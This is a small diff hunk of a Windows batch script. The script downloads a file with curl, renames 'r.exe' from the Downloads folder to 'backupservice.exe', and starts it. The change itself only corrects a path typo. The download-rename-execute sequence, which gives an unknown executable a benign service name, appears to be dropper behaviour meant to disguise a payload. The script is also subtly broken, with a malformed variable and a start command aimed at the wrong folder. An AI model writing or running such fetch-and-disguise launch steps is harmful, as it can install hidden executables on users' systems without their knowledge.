@@ -19,5 +19,5 @@ curl -L "%URL%" -o %OUTFILE%
 cd "C:\USers\%USER\"
 md Backups
 cd Backups
-move "C:\Users\%USER%\Downloads\r.exe" "C:\USers\%USER%\backupservice.exe"
+move "C:\Users\%USER%\Downloads\r.exe" "C:\Users\%USER%\backupservice.exe"
 start backupservice.exe
